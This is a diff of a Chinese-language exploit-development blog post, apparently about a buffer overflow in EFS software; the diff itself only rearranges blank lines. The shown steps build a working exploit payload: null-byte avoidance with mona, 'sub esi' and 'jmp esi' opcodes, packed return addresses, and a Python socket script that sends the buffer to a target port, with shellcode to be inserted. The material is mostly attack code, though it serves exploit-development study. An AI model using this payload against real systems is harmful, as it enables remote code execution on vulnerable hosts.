@@ -264,23 +264,20 @@ payload = 'A'*80 + struct.pack("<I", 0x019b68d4) + struct.pack("<I", 0x1001b371)
 ![img](https://raw.githubusercontent.com/carterMgj/blog_img/master/2017-06-07-fuzz-EFS/21.png)
 
 11. 使用这条指令是行不通的，因为指令的机器码中包含了可恶的"\x00"。可以用“sub esi,-0x18”来代替
-
 ```sh
 ！moona assemble -s sub esi,-0x28
 ```
-
 ![img](https://raw.githubusercontent.com/carterMgj/blog_img/master/2017-06-07-fuzz-EFS/22.png)
-12. 所以此时payload构造如下。如下图，成功执行到调整指令，“jmp esi”时，esi已经指向了我们想要的广阔的栈空间
 
+12. 所以此时payload构造如下。如下图，成功执行到调整指令，“jmp esi”时，esi已经指向了我们想要的广阔的栈空间
 ```sh
 payload = "A"*64 + "\x81\xee\xe8\xff\xff\xff" + "\xff\xe6"
 payload = payload.ljust(80,"A")
 payload += struct.pack("<I", 0x019b68d4) + struct.pack("<I", 0x1001b371) + “DDDD” + "C"*1000
 ```
-
 ![img](https://raw.githubusercontent.com/carterMgj/blog_img/master/2017-06-07-fuzz-EFS/23.png)
-13. 将payload中"DDDD"的位置换做shellcode就大功告成了
 
+13. 将payload中"DDDD"的位置换做shellcode就大功告成了
 ```python
 import socket
 import struct
@@ -317,5 +314,4 @@ s.connect((target,port))
 s.send(buf)
 s.close()
 ```
-
 ![img](https://raw.githubusercontent.com/carterMgj/blog_img/master/2017-06-07-fuzz-EFS/24.png)
